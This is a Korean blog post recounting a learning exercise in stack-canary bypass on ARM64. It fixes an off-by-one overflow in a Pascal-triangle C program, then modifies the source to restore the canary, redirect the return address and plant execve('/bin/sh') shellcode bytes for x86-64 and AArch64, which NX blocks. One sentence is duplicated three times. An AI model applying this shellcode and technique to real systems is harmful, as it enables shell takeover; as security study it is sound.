---
layout: post
title: "카나리 우회"
date: 2026-09-20
tags: [arm64, assembly, pwn]
---

pwnable 문제는 아니지만 **Stack Buffer Overflow** 문제를 풀면서 셸을 획득해보려 했으나 실패한 일련의 과정을 정리해보려 한다. 보안에 뜻을 두고 있지는 않지만 그래도 운영체제나 언어를 가리지 않고 **ROP**까지는 해보자라는 목표로 이번 실패가 나 자신에게도 동기부여가 됐으면 한다.

일단 주어진 소스 코드는 다음과 같다. 익스플로잇도 아니고 갑자기 웬 소스 코드인가 할 수 있지만 워게임 목적으로 만들어진 문제가 아니고 사용자의 입력을 요구하지 않기 때문에 실행 파일만으로 내 역량에서 할 수 있는 것은 스택 프레임의 구조와 매 실행마다 달라지는 카나리를 확인하는 것 뿐이었다. 따라서 실행 파일을 해킹 한다기보다는 소스 코드를 수정하며 카나리를 우회하는 과정을 보이고 카나리가 어떤 기능을 하고 어떻게 유출되는지 그리고 유출되면 위험한 이유 등을 보이겠다.
```c
#include <stdio.h>
#include <stdlib.h>

#define ROWS 14
enum { SIZE = ROWS * (ROWS + 1) / 2 };   /* 0..ROWS-1 행을 담는 정확한 크기 */

/* 행 i, 열 j 의 삼각 인덱스 */
static int tri_index(int i, int j) {
    return i * (i + 1) / 2 + j;
}

/* 파스칼의 삼각형을 tri[] 에 채운다. */
static void build_pascal(int *tri, int rows) {
    for (int i = 0; i <= rows; i++) {
        for (int j = 0; j <= i; j++) {
            int idx = tri_index(i, j);
            if (j == 0 || j == i) {
                tri[idx] = 1;                         /* 양 끝은 1 */
            } else {
                int up_left  = tri_index(i - 1, j - 1);
                int up_right = tri_index(i - 1, j);
                tri[idx] = tri[up_left] + tri[up_right];
            }
        }
    }
}

static long row_sum(const int *tri, int i) {
    long sum = 0;
    for (int j = 0; j <= i; j++) sum += tri[tri_index(i, j)];
    return sum;
}

static void print_row(const int *tri, int i) {
    printf("row %2d:", i);
    
    for (int j = 0; j <= i; j++) printf(" %d", tri[tri_index(i, j)]);
    printf("   (sum=%ld)\n", row_sum(tri, i));
}

int main(void) {
    int tri[SIZE];

    build_pascal(tri, ROWS);
    
    for (int i = 0; i < ROWS; i++) print_row(tri, i);

    printf("SIZE = %d\n", SIZE);
    
    return 0;
}
```
코드는 파스칼 삼각형을 14줄 만드는 코드이다.

파스칼 삼각형의 인덱스를 `tri_index` 함수를 사용해 일차원으로 표현하여 배열 `tri`를 만들었다.

`build_pascal`에서는 인덱스 `0`부터 `rows`까지 `tri`의 값들을 채우고 있다.

한 가지 의아한 부분은 `for`문의 초기값이 `i`, `j` 모두 0으로 시작하는데 조건으로 `i<=rows`, `j<=i`와 같이 등호가 섞여 있어서 해당 부분이 맞는지 확인해볼 필요가 있어 보인다.

`j`는 0번째 줄에서 0번까지 하나의 값, 1번째 줄에서 1번까지 0과 1 두 개의 값으로 맞게 들어간 것 같다.

`i`를 확인해보자. `tri`의 크기가 `SIZE`인데 이는 `#define ROWS 14`으로 정의된 `ROWS`에 대해 `0...ROWS-1` 까지의 행을 담는 정확한 크기라는 친절한 주석까지 달려 있다. 즉, `tri`는 `0`부터 `ROWS-1`까지를 담는 배열인데 `build_pascal` 함수의 인자로 넘어온 `ROWS`행까지 `tri[idx]`로 접근해 값을 바꾸는 것은 지역 변수가 저장된 스택 버퍼 공간의 `tri`에 할당된 영역을 벗어나 값을 덮어쓰게 되므로 문제가 된다.

따라서 `i`의 반복 조건에서 `rows` 즉, 인자로 전달 받은 `ROWS` 행은 포함되면 안 된다.

다만, 이렇게 하고 마무리하면 스택 버퍼 오버플로우는 막았지만 스택 카나리는 구경도 못 하고 끝나버린다.

그래서 좀 더 공부해보자는 생각에 과거의 기억을 끄집어내 카나리 우회를 통해 셸을 획득해보려고 했다.

![main 어셈블리](/assets/images/canary-bypass/disas_main.png)

우선 스택 프레임 구조를 파악하기 위해 `main` 함수의 어셈블리를 확인했다.

[ARM64 어셈블리]({{ '/til/arm64-assembly/' | relative_url }})는 나도 친해져보려고 노력중이지만 확실히 익숙하진 않은 것 같다.는 나도 친해져보려고 노력중이지만 확실히 익숙하진 않은 것 같다.는 나도 친해져보려고 노력중이지만 확실히 익숙하진 않은 것 같다.

`sp`에 `#0x1d0`을 빼서 스택 프레임 공간을 할당하고 `sp+448`(`sp+0x1c0`) 위치에 `x29`(base pointer), `sp+0x1c8` 위치에 `x30`(ret addr)을 저장한다.

`sp+0x1c0`을 `sp`에 넣고 `adrp`와 `ldr`로 `0xaaaaaaabf000+4072`에 해당하는 주소를 `x0`에 저장하고 그 주소에 담긴 값을 스택 프레임의 `sp+0x1b8`에 저장하고 있다.

이 값이 뭔지 `x0`와 `sp+0x1b8`의 값을 출력해 확인해보겠다.

![stack_check_guard](/assets/images/canary-bypass/stack_chk_guard.png)

![cnry](/assets/images/canary-bypass/print_cnry.png)

x0의 주소에서 가져온 값은 `__stack_chk_guard`라는 건데 그 값이 스택 프레임의 `sp+0x1b8` 위치에 저장된 것을 볼 수 있다.

그렇다. 이 값이 스택 카나리인 것이다.

그리고 `build_pascal`을 호출하기 전 매개변수 값들을 `x0`와 `x1`(`w1`)에 세팅하는데 `x0`는 `int *tri`에 해당하는 값으로 `tri`의 주소값으로 예상할 수 있는데 그 주소를 `sp+0x10`으로 하고 `int rows`에 해당하는 값으로 `x1`(`w1`)에 `0xe` 즉, `14`를 저장하고 있다.

이렇게 매개변수 세팅을 마치고 `build_pascal` 호출을 하게 된다.

그럼 여기까지 지금의 스택 프레임의 구조는 대략적으로 파악이 됐다.

```text
높은 주소 (스택 위, 이전 프레임 방향)

sp+0x1d0 +--------------------+   프레임 최상단 (호출자와의 경계)
         | ret addr (x30)     |   8 bytes, 반환 주소
sp+0x1c8 +--------------------+
         | saved x29          |   8 bytes, 호출한 함수의 base pointer
sp+0x1c0 +--------------------+
         | stack canary       |   8 bytes, __stack_chk_guard
sp+0x1b8 +--------------------+
         | tri[105]           |   tri 범위 밖 (여기부터 넘치면 카나리 침범)
sp+0x1b4 +--------------------+
         | tri[104]           |   tri의 마지막 유효 원소 (13행 마지막)
         |        ...         |   tri 배열 본체 (int x 105)
         | tri[0]             |   tri 시작
sp+0x10  +--------------------+
         |        ...         |
sp+0x00  +--------------------+   sp (프레임 최하단)

낮은 주소 (스택 아래)
```

스택 프레임 공간이 `0x1d0`만큼 할당 되었는데 `sp+0x1c8`에는 `x30`이 가지고 있던 `ret address`를 저장했고 `sp+0x1c0`에는 `x29`가 가지고 있던 `main을 호출한 함수의 base pointer`를 저장했고 `sp+0x1b8`에는 `스택 카나리`를 저장해 `base pointer`와 `ret address`가 덮어써지는 것을 확인할 수 있는 안전 장치를 마련해뒀다. 그리고 `sp+0x10`부터 `tri`의 원소들이 인덱스에 따라 저장되겠구나 생각할 수 있다.

사실 이 코드는 `print_row`에서는 교묘하게 인덱스가 `ROWS`인 행은 출력 범위에서 빼버려서 카나리를 유출하지는 않는다. 그래도 소스 코드를 수정하며 단순히 14번 인덱스 행을 부등호 처리로 빼는 것이 아닌 덮어 쓰는 값을 확인하며 카나리 검사를 피하고 이게 왜 문제가 되는지 보이겠다.

지금의 코드는 `ROWS` 행까지 파스칼 삼각형 값으로 덮어 써버려서 카나리와 반환 주소를 덮어 써서 문제가 되고 있다.

실제로 반복문에서 `ROWS` 행을 빼지 않고 `tri_index(14, 1)`, `tri_index(14, 2)`, `tri_index(14, 5)`, `tri_index(14, 6)`만 `continue`로 넘겨주면 에러가 발생하지 않는다.

```c
static void build_pascal(int *tri, int rows) {
    for (int i = 0; i <= rows; i++) {
        for (int j = 0; j <= i; j++) {
            ////
            if(i==14&&(j==1||j==2||j==5||j==6)) //cnry랑 ret addr만 건드리지 않으면 에러 안 남.
                continue;
            ////
            int idx = tri_index(i, j);
            if (j == 0 || j == i) {
                tri[idx] = 1;                         /* 양 끝은 1 */
            } else {
                int up_left  = tri_index(i - 1, j - 1);
                int up_right = tri_index(i - 1, j);
                tri[idx] = tri[up_left] + tri[up_right];
            }
        }
    }
}
```

앞에서 스택 프레임을 보였으므로 `tri`와 [카나리, return address]와의 offset(거리)으로 인덱스를 구할 수 있다. 스택 프레임이 익숙하지 않을 수 있으므로 저 인덱스들이 왜 카나리의 주소와 return address를 저장한 주소인지 보이겠다.

`tri`의 주소인 `sp+0x10`에서 카나리의 주소 `sp+0x1b8`까지의 offset(거리)인 `0x1a8(=424)`만큼을 `int` 배열이므로 `int`의 크기인 4로 나눠주면 카나리가 위치한 곳이 `tri`의 인덱스 106번에 해당하는 위치라는 것을 알 수 있다.

지금 `tri`의 `SIZE`는 105로 선언되어 있고 그 것은 인덱스 13행 그러니까 14번째 줄까지의 파스칼 삼각형 값들의 개수이다. 그러므로 13행의 마지막 원소는 `tri[104]`였을 것이다.

따라서 14행의 첫번째 원소인 `tri_index(14,0)`이 `tri[105]`이고 카나리가 위치한 106번 인덱스는 `tri_index(14,1)`이 된다. 하지만 이 값은 정수이므로 4바이트이고 실제 카나리는 8바이트이므로 `tri_index(14,1)`, `tri_index(14,2)`로 카나리를 상위 / 하위 4바이트로 나눠서 넣어줘야 한다.

마찬가지로 함수가 끝나고 돌아갈 주소가 저장된 위치도 `sp+0x1c8`에 저장된 것을 디버깅 과정에서 확인했기 때문에 `tri`와의 offset을 계산하면 `tri_index(14,5)`, `tri_index(14,6)`에 해당하는 것을 알 수 있다. 여기도 주소는 8바이트인데 인덱스마다 저장하는 값은 4바이트이므로 두 개의 인덱스로 나눠져 있는 것이다.

메모리에 값을 4바이트로 나눠서 넣든 1바이트씩 나눠서 넣든 연속된 8바이트가 카나리이고 return address이기만 하면 된다.

카나리와 반환 주소를 덮어쓰지 않게 해서 에러가 발생하지 않게 해봤는데 이번에는 카나리를 얻어서 `tri_index(14,1)`, `tri_index(14,2)`를 카나리로 덮어 쓰고 정상 동작하는지 확인해보겠다.
```c
static void build_pascal(int *tri, int rows) {
    ////
    // 카나리 백업
    int cnry1 =  tri[tri_index(14, 1)];
    int cnry2 =  tri[tri_index(14, 2)];
    ////
    for (int i = 0; i <= rows; i++) {
        for (int j = 0; j <= i; j++) {
            ////
            if(i==14&&(j==5||j==6)) //ret addr만 덮어쓰지 않고 카나리는 오염됨.
                continue;
            ////
            int idx = tri_index(i, j);
            if (j == 0 || j == i) {
                tri[idx] = 1;                         /* 양 끝은 1 */
            } else {
                int up_left  = tri_index(i - 1, j - 1);
                int up_right = tri_index(i - 1, j);
                tri[idx] = tri[up_left] + tri[up_right];
            }
        }
    }
    ////
    // 카나리 덮어 쓰기
    tri[tri_index(14,1)] = cnry1;
    tri[tri_index(14,2)] = cnry2;
    ////
}
```
일단 반복문을 돌며 파스칼 삼각형 값으로 카나리를 덮어 쓰기 전에 카나리 값들을 변수에 담아뒀다.

그리고 반복문을 돌며 카나리 값이 파스칼 삼각형 값으로 덮어 씌워지게 하고 다시 카나리 값으로 해당 값을 덮어 써줬다.

이렇게 하면 카나리 값이 복원되어 에러가 발생하지 않는다.

실제로는 소스 코드가 주어지지 않고 실행 파일을 통해 카나리를 얻어야 하는데 `scanf`나 `gets` 함수처럼 입력 함수에서 입력 크기를 지정하지 않는 경우 카나리의 첫 바이트 항상 `\x00`인 값을 덮어쓰면 NULL 문자가 사라졌으므로 이후 출력에서 카나리까지 출력하게 되어 카나리를 얻을 수 있다.

여기서는 소스 코드를 수정할 수 있으므로 `tri`로 카나리가 위치한 인덱스에 접근해 카나리를 얻었다.

그럼 이렇게 카나리가 유출되는 것이 왜 위험할까?

카나리가 유출되면 반환 주소를 덮어 쓸 수가 있다.

다음은 카나리를 우회해 셸을 획득하기 위해 시도한 과정을 보이며 반환 주소를 덮어 쓴다는 것이 위험한 이유를 보이겠다.

```c
static void build_pascal(int *tri, int rows) {
    ////
    // 카나리 백업
    int cnry1 =  tri[tri_index(14, 1)];
    int cnry2 =  tri[tri_index(14, 2)];
    ////
    for (int i = 0; i <= rows; i++) {
        for (int j = 0; j <= i; j++) {
            int idx = tri_index(i, j);
            if (j == 0 || j == i) {
                tri[idx] = 1;                         /* 양 끝은 1 */
            } else {
                int up_left  = tri_index(i - 1, j - 1);
                int up_right = tri_index(i - 1, j);
                tri[idx] = tri[up_left] + tri[up_right];
            }
        }
    }
    ////
    // shellcode
    // x86-64: \x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05
    // AArch64: \xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe3\x45\x8c\xd2\x23\xcd\xad\xf2\xe3\x65\xce\xf2\x03\x0d\xe0\xf2\xe3\x8f\x1f\xf8\xe0\x03\x00\x91\xa8\x1b\x80\xd2\x01\x00\x00\xd4
    int shellcode[10] = {0xaa1f03e1, 0xaa1f03e2, 0xd28c45e3, 0xf2adcd23, 0xf2ce65e3, 0xf2e00d03, 0xf81f8fe3, 0x910003e0, 0xd2801ba8, 0xd4000001};

    int tri_upper_addr = (long)tri>>32;
    int tri_lower_addr = (long)tri;
    // 카나리 덮어 쓰기
    tri[tri_index(14,1)] = cnry1;
    tri[tri_index(14,2)] = cnry2;
    // 반환 주소를 tri 배열의 주소로 변경
    tri[tri_index(14,5)] = tri_lower_addr;
    tri[tri_index(14,6)] = tri_upper_addr;
    // tri[0]~tri[9]까지 shellcode 넣기
    for(size_t i=0;i<sizeof(shellcode)/sizeof(shellcode[0]);i++)
        tri[i] = shellcode[i];
    ////
}
```
기존에 카나리와 반환 주소를 덮어 쓰지 않도록 continue로 넘겨줬지만 이번엔 파스칼 삼각형 값으로 덮어쓰게 두고 카나리는 백업해둔 카나리로 복원했다.

그리고 셸 코드라고 해서 구글링하면 이미 기계어로 만들어져 있는 코드들이 많은데 `execve("/bin/sh")`를 실행하는 어셈블리 코드를 작성하고 이를 기계어로 바꾼 것이다.

`execve("/bin/sh")`를 실행하면 셸을 실행할 수 있기 때문에 해당 서버 또는 pc의 권한을 탈취할 수 있다.

이 셸 코드를 `tri` 시작 주소에 집어 넣고 반환 주소를 `tri`의 주소로 하면 이 셸 코드를 실행할 수 있다.

파이썬으로 익스플로잇을 작성할 때 `pwntools`로 하던 것을 C언어에서는 `memcpy`를 사용하면 된다고는 하는데 코드 길이가 얼마 되지 않기도 하고 익숙하지 않아 직접 4바이트 단위로 정수로 변환해 셸 코드 배열을 만들어 값을 넣어줬다.

정수를 16진수로 출력한 값과 바이트의 순서가 역순인 것은 리틀 엔디안, 빅 엔디안 개념에 대해 찾아보길 바란다.

이 때까지만 해도 되게 신나서 작업을 이어갔지만 어떻게 보면 너무나 당연하게도 `NX`가 활성화 되어 있어 스택에는 실행 권한이 없어 `tri`의 코드를 실행하지 못해 셸을 획득하지는 못했다.

그래도 반환 주소로 덮어 씌워진 `tri`의 주소로 가서 셸 코드를 실행하지 못하고 에러가 발생한 것을 확인했다.

![return_address_overwrite](/assets/images/canary-bypass/return_address_overwrite.png)

![SIGSEGV](/assets/images/canary-bypass/SIGSEGV.png)

사실 이런 시도를 하기 전에 디버깅 과정에 보안 레벨을 확인하는 과정을 거쳤어야 했는데 워낙 오랜만이라 다짜고짜 달려들었더니 NX에 막혀버렸다.

![checksec](/assets/images/canary-bypass/checksec.png)

`checksec`로 보여지는 것으로는 **ROP(Return Oriented Programming)**를 통해 공격 가능하다고 해서 ROP도 가물가물하지만 해볼까 하다가 `ROPgadget`으로 쓸만한 코드 조각들을 찾는데 죄다 ARM64 어셈블리라 정신이 나갈 것 같아서 ARM64 어셈블리와도 좀 더 친해지고 ROP도 복습하고 파이썬으로 익스플로잇 코드를 짜는 방식도 복기할 필요성을 느꼈다.

일단 주어진 과제에서 공부해야할 개념들도 많아보여서 과제들을 마무리하고 개념들을 충분히 습득한 뒤 시간의 여유가 생기면 천천히 해볼 생각이다.

비록 셸을 획득하지는 못 해서 아쉽긴 하지만 스택 카나리의 역할과 유출의 위험성을 보이는 것으로 의미 있는 시간이었다.